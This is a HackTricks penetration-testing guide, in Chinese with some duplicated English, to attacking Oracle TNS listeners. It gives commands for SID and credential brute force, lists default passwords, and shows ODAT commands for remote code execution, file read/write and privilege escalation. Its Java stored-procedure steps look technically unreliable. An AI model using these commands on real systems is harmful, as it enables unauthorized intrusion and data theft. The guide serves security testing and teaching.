# 1521,1522-1529 - Pentesting Oracle TNS Listener

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

## 基本信息

Oracle数据库（Oracle DB）是来自Oracle Corporation的关系数据库管理系统（RDBMS）（来自[这里](https://www.techopedia.com/definition/8711/oracle-database)）。

在枚举Oracle时，第一步是与通常位于默认端口（1521/TCP，-你也可能在1522-1529上获得辅助监听器）的TNS Listener进行通信。
```
1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)
1748/tcp open  oracle-tns    Oracle TNS Listener
```
## 概述

1. **枚举版本**信息（搜索已知漏洞）
2. **暴力破解TNS监听器**通信（不总是必需的）
3. **枚举**/暴力破解**SID名称**（如数据库名称）
4. **暴力破解凭据**以发现有效的SID名称
5. 尝试**执行代码**

为了使用MSF Oracle模块，您需要安装一些依赖项：[**安装**](oracle-pentesting-requirements-installation.md)

## 枚举

可以使用的工具有：nmap、MSF和[tnscmd10g](http://dokfleed.net/files/audit/tnscmd10g.zip)。

### TNS监听器版本
```bash
nmap --script "oracle-tns-version" -p 1521 -T4 -sV <IP>
msf> use auxiliary/scanner/oracle/tnslsnr_version
#apt install tnscmd10g
tnscmd10g version -p 1521 -h <IP>
```
其他有用的TNS监听器命令：

| **命令**       | **目的**                                                         |
| ------------ | --------------------------------------------------------------- |
| ping         | 对监听器进行ping测试                                               |
| version      | 提供监听器版本和平台信息的输出                                       |
| status       | 返回监听器当前状态和使用的变量                                     |
| services     | 转储服务数据                                                       |
| debug        | 将调试信息转储到监听器日志中                                         |
| reload       | 重新加载监听器配置文件                                             |
| save\_config | 将监听器配置文件写入备份位置                                       |
| stop         | 调用监听器关闭                                                     |

如果**收到错误**，可能是因为**TNS版本不兼容**（使用`tnscmd10`的`--10G`参数），如果**错误仍然存在**，则监听器可能受到**密码保护**（您可以在[**此处详细列出的错误列表中查看所有错误**](https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7)）- 不用担心... hydra来拯救：
```
hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
```
TNS监听器可能容易受到**中间人攻击（MitM）**。[在这里检查服务器是否容易受到攻击以及如何执行攻击（所有版本，包括12c版本）](tns-poison.md)。

### SID枚举

#### **什么是SID**

SID（服务标识符）实际上是数据库名称，根据安装情况，您可能有一个或多个默认的SID，甚至可以完全自定义由dba定义的SID。

在一些旧版本中（在9版本中有效），您可以请求SID，然后数据库会将其发送给您：
```bash
tnscmd10g status-p 1521 -h <IP> #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)

#msf1
msf> use auxiliary/scanner/oracle/sid_enum
msf> set rhost <IP>
msf> run
#msf2
msf> use auxiliary/admin/oracle/tnscmd
msf> set CMD (CONNECT_DATA=(COMMAND=STATUS))
msf> set rhost <IP>
msf> run #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)
```
如果无法通过这种方式访问到SIDs，您将需要对其进行暴力破解：

**SID暴力破解**

我已将nmap和MSF的SID列表合并为一个（去除了重复项）：

{% file src="../../.gitbook/assets/sids-oracle.txt" %}
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 <IP> oracle-sid
patator oracle_login host=<IP> sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505
./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txt
msf> use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt
nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids
```
为了使用**oracle\_login**和**patator**，您需要**安装**以下内容：
```
pip3 install cx_Oracle --upgrade
```
## **目标账户**

**有SID吗？** 很好，现在让我们继续下一个任务，提取用户账户信息。从这一点开始，您可以连接到监听器并暴力破解凭据。

**Metasploit** _\*\*scanner/oracle/oracle\_login_ 它内置了一个字典，用于表示用户账户信息的**最常见的默认值**，以登录名:密码的形式呈现。顺便说一句，这些默认条目代表了Oracle中最常见和最严重的安全问题之一。

**Nmap** 也可以通过脚本 _oracle-brute_ 来帮助。请注意，此脚本**混合了登录名和密码**，即它会尝试每个登录名与每个密码的组合，这需要相当长的时间！

### **默认密码**

以下是与Oracle关联的一些默认密码：

* **DBSNMP/DBSNMP** — 智能代理使用此密码与数据库服务器通信（更改它需要一些工作）
* **SYS/CHANGE\_ON\_INSTALL** — Oracle v9及之前的默认sysdba账户，在10g版本中必须更改！
* **PCMS\_SYS/PCMS\_SYS** — 默认x账户
* **WMSYS/WMSYS** — 默认x账户
* **OUTLN/OUTLN** — 默认x账户
* **SCOTT/TIGER** — 默认x账户

其他**默认密码**可以在[这里](http://www.petefinnigan.com/default/oracle\_default\_passwords.htm)和[这里](https://cirt.net/passwords?vendor=Oracle)找到。

版本11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2和11.2.0.3容易受到**离线暴力破解**的攻击。[**在这里阅读更多关于这种技术的信息。**](remote-stealth-pass-brute-force.md)

### 用户名/密码暴力破解

不同的工具为oracle提供了**不同的用户名/密码列表**：

* **oscan:** _/usr/share/oscanner/accounts.default_ (169行)
* **MSF-1:** _from_ admin/oracle/oracle\_login \_\_/usr/share/metasploit-framework/data/wordlists/oracle\_default\_passwords.csv (598行)
* **MSF-2:** _from scanner/oracle/oracle\_login_ _/usr/share/metasploit-framework/data/wordlists/oracle\_default\_userpass.txt_ (568行)
* **Nmap:** _/usr/share/nmap/nselib/data/oracle-default-accounts.lst_ (687行)

我已经**混合**了它们并**删除了重复项**：

{% file src="../../.gitbook/assets/users-oracle.txt" %}

{% file src="../../.gitbook/assets/pass-oracle.txt" %}

### [暴力破解](../../generic-methodologies-and-resources/brute-force.md#oraclesql)

现在，您**知道一个有效的SID和有效的凭据**。要连接到数据库，您需要使用工具：_**sqlplus**_，并且需要按照一些步骤进行安装：

[安装](oracle-pentesting-requirements-installation.md)

使用已知凭据登录：
```
sqlplus <username>/<password>@<ip_address>/<SID>;
```
如果TNS监听器位于非默认端口（例如TCP/1522）上：
```
sqlplus <username>/<password>@<ip_address>:<port>/<SID>;
```
如果一个账户拥有系统数据库权限（sysdba）或系统操作员权限（sysop），你可能希望尝试以下操作：
```bash
sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';
#Example:
sqlplus SYSTEM/MANAGER@192.168.0.2/ORCL 'as sysdba'
```
## **一体化工具**

**一个有趣的工具是 oscanner**，它将尝试获取一些有效的 SID，然后对有效凭据进行暴力破解，并尝试提取一些信息：
```bash
#apt install oscanner
oscanner -s <IP> -P <PORT>
```
另一个可以完成所有这些任务的工具是 [**odat**](https://github.com/quentinhardy/odat)：
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py --help #It shouldn't be problems in Kali
./odat.py all -s <IP> -p <PORT>
./odat.py all -s <IP> -p <PORT> -d <SID> #To bruteforce accounts for that SID
```
使用这些选项（_-s_和_-p_），ODAT将在第一步中**搜索有效的SID**（系统ID）。您可以配置一些选项来配置方法（例如字典列表或暴力攻击）。默认情况下，ODAT将使用一个大的字典列表，并进行一个小的暴力攻击。

如果ODAT**找到至少一个SID**（例如_ORCL_），它将**搜索有效的Oracle账户**。它将在**找到的每个SID上**执行此操作。您可以为凭据指定一些选项（例如_--accounts-file_，_--accounts-files_，_--login-as-pwd_）。

对于**每个有效的账户**（例如_SYS_）**在每个有效的实例**（SID）上，ODAT将返回**每个Oracle用户可以做什么**（例如反向shell，读取文件，成为DBA）。

[**ODAT Wiki**](https://github.com/quentinhardy/odat/wiki)

## 远程代码执行

至少有两种不同的方法可以执行命令，例如使用Java过程和DBMS\_SCHEDULER包。顺便说一下，如果Web应用程序中存在SQL注入，并且运行该应用程序的用户具有足够的权限，您也可以实现RCE。在这个阶段，我强烈建议准备Oracle数据库攻击工具：[ODAT](https://github.com/quentinhardy/odat)。

### 安装ODAT
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py #It shouldn't be problems in Kali
```
### 通过Java存储过程执行代码

In some cases, it may be possible to execute arbitrary code on an Oracle database server by exploiting a vulnerability in the Java stored procedure feature. This feature allows developers to write and execute Java code within the database.

在某些情况下，可以通过利用Java存储过程功能中的漏洞，在Oracle数据库服务器上执行任意代码。该功能允许开发人员在数据库中编写和执行Java代码。

To exploit this vulnerability, you need to have the necessary privileges to create and execute Java stored procedures. Once you have these privileges, you can create a malicious Java stored procedure that executes the code you want.

要利用这个漏洞，您需要具备创建和执行Java存储过程的必要权限。一旦获得这些权限，您可以创建一个恶意的Java存储过程来执行您想要的代码。

Here are the general steps to execute code via a Java stored procedure:

以下是通过Java存储过程执行代码的一般步骤：

1. Create a Java class that contains the code you want to execute. This class should implement the `oracle.jdbc.OracleCallableStatement` interface.

   创建一个包含您想要执行的代码的Java类。该类应该实现`oracle.jdbc.OracleCallableStatement`接口。

2. Compile the Java class into a bytecode file (`.class`).

   将Java类编译为字节码文件（`.class`）。

3. Create a Java stored procedure in the Oracle database using the `CREATE PROCEDURE` statement. This procedure should call the compiled Java class and execute the desired code.

   使用`CREATE PROCEDURE`语句在Oracle数据库中创建一个Java存储过程。该存储过程应该调用编译的Java类并执行所需的代码。

4. Execute the Java stored procedure using a SQL statement or a database tool.

   使用SQL语句或数据库工具执行Java存储过程。

By following these steps, you can execute arbitrary code on the Oracle database server through a Java stored procedure. However, it's important to note that exploiting this vulnerability requires proper permissions and may be considered unauthorized access.

通过按照这些步骤操作，您可以通过Java存储过程在Oracle数据库服务器上执行任意代码。然而，需要注意的是，利用这个漏洞需要适当的权限，并且可能被视为未经授权的访问。
```bash
./odat.py java -s <IP> -U <username> -P <password> -d <SID> --exec COMMAND
```
### 通过调度程序执行代码

The Oracle Scheduler is a powerful tool that allows you to schedule and automate tasks within the Oracle database. However, it can also be exploited by hackers to execute malicious code.

To execute code via the Scheduler, you can follow these steps:

1. Identify the target database's Oracle version.
2. Use the appropriate payload for the specific version.
3. Create a job using the `DBMS_SCHEDULER.CREATE_JOB` procedure.
4. Set the job type to `PLSQL_BLOCK` and provide the malicious code as the job action.
5. Schedule the job to run at a specific time or interval.
6. Enable the job using the `DBMS_SCHEDULER.ENABLE` procedure.

Once the job is enabled, the malicious code will be executed according to the specified schedule. This can allow an attacker to gain unauthorized access, escalate privileges, or perform other malicious activities within the Oracle database.

It is important to note that exploiting the Oracle Scheduler requires proper authorization and should only be done for legitimate purposes, such as penetration testing or security auditing. Unauthorized access or misuse of this technique is illegal and unethical.
```bash
./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec "C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK"
```
[更多细节请点击这里](oracle-rce-and-more.md#rce-scheduler)

### 通过外部表执行代码
```bash
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --exec "C:/windows/system32" "calc.exe"
```
‘ODAT.py’需要特权‘CREATE ANY DIRECTORY’，默认情况下只授予DBA角色，因为它尝试从任何目录而不仅仅是“你的”目录执行文件（此攻击的手动版本需要更少的特权）。

[更多细节请参见此处](oracle-rce-and-more.md#rce-external-tables)

## 读/写文件
```bash
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
[更多细节请点击这里](oracle-rce-and-more.md#read-write-files)

## 提升权限

[更多细节请点击这里](oracle-rce-and-more.md#elevating-privileges)

您可以使用odat中的[privesc模块](https://github.com/quentinhardy/odat/wiki/privesc)来提升权限。在该链接中，您可以找到使用odat提升权限的**多种方法**。
```bash
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help
```
在Oracle 10.1.0.3.0上测试的漏洞 - 应该适用于10.1.0.5.0及以上版本，据说也适用于11g。在Oracle关键补丁更新2007年10月修复。
```bash
msf> use auxiliary/sqli/oracle/lt_findricset_cursor
```
## 免费的虚拟环境用于测试

如果你想练习攻击Oracle数据库，最安全的方法是注册Oracle Developer Days Virtualbox VM：

{% embed url="http://www.oracle.com/technetwork/database/enterprise-edition/databaseappdev-vm-161299.html" %}

本文中的大部分信息来自以下来源：[https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573](https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573) 和 [https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/](https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/)

其他有趣的**参考资料**：

[http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html](http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html)

## HackTricks 自动命令
```
Protocol_Name: Oracle    #Protocol Abbreviation if there is one.
Port_Number:  1521     #Comma separated if there is more than one.
Protocol_Description: Oracle TNS Listener         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for Oracle
Note: |
Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation

#great oracle enumeration tool
navigate to https://github.com/quentinhardy/odat/releases/
download the latest
tar -xvf odat-linux-libc2.12-x86_64.tar.gz
cd odat-libc2.12-x86_64/
./odat-libc2.12-x86_64 all -s 10.10.10.82

for more details check https://github.com/quentinhardy/odat/wiki

https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener

Entry_2:
Name: Nmap
Description: Nmap with Oracle Scripts
Command: nmap --script "oracle-tns-version" -p 1521 -T4 -sV {IP}
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
